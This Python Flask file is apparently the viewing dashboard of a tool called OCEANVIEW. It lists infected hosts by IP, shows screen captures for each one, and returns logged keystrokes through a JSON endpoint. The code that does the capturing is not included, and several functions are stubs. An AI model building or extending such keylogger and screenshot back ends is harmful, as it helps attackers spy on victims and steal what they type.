"""
show what's in OCEANVIEW's database.
author: Ethan Witherington.
"""

from flask import Flask, render_template, request, abort, jsonify
import data as databaseobj


# route functions flagged as unused, disabling warning for this function.
# pylint: disable=W0612
def init():
    """ run the frontend app """

    database = databaseobj.Database("db.sqlite", "database/build_db.sql")
    app = Flask(__name__)

    @app.route('/')
    def index():
        """Display returning hosts"""
        # grab unique hosts from database
        hosts = database.get_unique_hosts()

        # render template
        return render_template('index.html', hosts=hosts)

    @app.route('/overview/<string:addr>')
    def machine(addr='192.168.420.69'):
        """Show info about a specific machine"""
        # Grab screencapture filepath from database
        try:
            screen_path = database.get_files(addr)[-1][1]
        except:
            screen_path = ""

        # Validate the IP.
        if validate_ip(addr):
            return render_template('overview.html', addr=addr, screen_path=screen_path)
        return "Invalid IP. You're BAD and you should feel BAD."

    @app.route('/data', methods=['POST'])
    def data():
        """
            Take some JSON, return what it asks for.
            {
                type: "text" or "shot" or "ip"
                since: timestamp # Get all of type since this time. Return all IPs.
                addr: IP address of the machine we want data about.
            }
            return all (type)s that have a timestamp later than (since)
            in the form of an array of strings.
            Strings are plaintext for text and IPs, and filenames for shots.
            If there are a lot, only return 100.
        """
        # Make sure it's JSON
        if not request.is_json:
            print("data request was not JSON.")
            abort(400)
        json = request.get_json()
        if not 'type' in json:
            print("data request did not include a type")
            abort(400)
        if not 'since' in json:
            print("data request did not include a since")
            abort(400)
        if not 'addr' in json:
            print("data request did not include an ip address.")
            abort(400)
        if json['type'] == 'text':
            return jsonify(get_text(json['since'], json['addr'], database))
        """if json['type'] == 'shot':
            return jsonify(get_shots(json['since']))
        if json['type'] == 'ip':
            return jsonify(get_ips())"""
        abort(400)
        return None  # God Fucking Damn You PEP8

    @app.route('/brewcoffee')
    def make_coffee():
        """Return code 418, as this is a teapot."""
        return "<h1>418</h1>", 418

    @app.after_request
    def add_header(r): # pylint: disable=c0103
        """
        Add headers to both force latest IE rendering engine or Chrome Frame,
        and also to cache the rendered page for 10 minutes.
        """
        r.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        r.headers["Pragma"] = "no-cache"
        r.headers["Expires"] = "0"
        r.headers['Cache-Control'] = 'public, max-age=0'
        return r

    return app


def validate_ip(_addr):
    """Tell if an IP is a valid IP."""
    return True


def get_text(_since, addr, database):
    """Get text later than since from the db"""
    raw = database.get_keystrokes(addr)
    """
    database.get_keystrokes returns:
    [
        (ip, keystroke, timestamp),
        (ip, keystroke, timestamp)
    ]
    """
    parsed = []
    for entry in raw:
        parsed.append(entry[1])
    return parsed


def get_shots(_since, addr, database):
    """Get screenshots later than since"""
    files = database.get_files(addr)
    """
    database.get_files returns:
    [
        (ip, filepath, timestamp),
        (ip, filepath, timestamp)
    ]
    """
    return None


def get_ips():
    """Return all IP addresses in the DB"""
    return None
